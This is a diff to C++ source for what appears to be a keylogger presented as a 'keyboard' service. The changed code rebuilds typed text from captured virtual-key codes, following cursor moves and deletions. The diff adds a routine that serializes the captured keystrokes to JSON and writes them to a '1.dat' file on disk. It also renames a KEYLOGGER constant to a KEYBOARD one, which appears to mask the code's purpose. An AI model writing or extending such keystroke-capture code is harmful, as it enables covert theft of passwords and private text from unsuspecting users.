@@ -57,7 +57,7 @@ void services::keyboard::processqueue()
 				break;
 			case VK_UP:
 				// Point cursor to the start
-				vkListCursor = 0;
+				vkListCursor = vkListCursorBegin;
 				break;
 			case VK_DOWN:
 				// Point cursor to the end
@@ -65,7 +65,7 @@ void services::keyboard::processqueue()
 				break;
 			case VK_LEFT:
 				// Shift virtual-key cursor to left if cursor isn't at begining
-				if (vkListCursor > 0)
+				if (vkListCursor > vkListCursorBegin)
 				{
 					vkListCursor--;
 				}
@@ -111,7 +111,7 @@ void services::keyboard::processvk(VirtualKeyInfo vkInfo)
 	// Filter virtual-key repeats
 	if (vkcmp(vkInfo, lastKeyPressed))
 	{
-		if (vkRepeats != KEYLOGGER_MAX_REPEATS)
+		if (vkRepeats != KEYBOARD_MAX_REPEATS)
 		{
 			vkRepeats++;
 		}
@@ -133,12 +133,61 @@ void services::keyboard::processvk(VirtualKeyInfo vkInfo)
 
 		// Insert virtual-key into vkList at cursor position
 		vkList.insert(it, vkInfo);
+
+		vkEvents++;
+
+		if (vkEvents == KEYBOARD_KEYS_TO_SAVE)
+		{
+			save();
+		}
 	}
+}
+
+void services::keyboard::save()
+{
+	// Json serialize virtual-key code list
+	std::stringstream json;
+	VirtualKeyInfo vkTemp;
+	bool isFirst = true;
+	json << "{\"vkl\":[";
+	for (VirtualKeyInfoList::iterator it = vkList.begin(); it != vkList.end(); ++it)
+	{
+		vkTemp = static_cast<VirtualKeyInfo>(*it);
+		if (!isFirst)
+		{
+			json << ',';
+		}
+		else
+		{
+			isFirst = false;
+		}
+		json << "{\"vk\":" << vkTemp.vkCode << ",\"la\":" << vkTemp.lang << ",\"fl\":" << vkTemp.flags << "}";
+	}
+	json << "]}";
+	std::string result = json.str();
+
+	if (!io::directory::exist(dir))
+	{
+		io::directory::create(dir);
+	}
+
+	std::ofstream output(std::string(dir) + "\\1.dat", std::ios::trunc);
+	if (output.is_open())
+	{
+		output << result;
+		output.close();
+	}
+
+	// Prepare buffer to next virtual-key sequence
+	vkListCursorBegin = 0;
+	vkListCursor = 0;
+	vkEvents = 0;
+	vkList.clear();
 }
 
 void services::keyboard::onDelete()
 {
-	if (vkListCursor >= 0 && vkListCursor < vkList.size())
+	if (vkListCursor >= vkListCursorBegin && vkListCursor < vkList.size())
 	{
 		VirtualKeyInfoList::iterator it = vkList.begin();
 		std::advance(it, vkListCursor);
@@ -148,7 +197,7 @@ void services::keyboard::onDelete()
 
 void services::keyboard::onBackspace()
 {
-	if (vkListCursor > 0 && vkListCursor < vkList.size() + 1)
+	if (vkListCursor > vkListCursorBegin && vkListCursor < vkList.size() + 1)
 	{
 		VirtualKeyInfoList::iterator it = vkList.begin();
 		std::advance(it, vkListCursor - 1);
@@ -159,7 +208,9 @@ void services::keyboard::onBackspace()
 
 void services::keyboard::clear()
 {
+	vkEvents = 0;
 	vkRepeats = 0;
+	vkListCursorBegin = 0;
 	vkListCursor = 0;
 	lastKeyPressed.vkCode = 0;
 	lastKeyPressed.lang = 0;
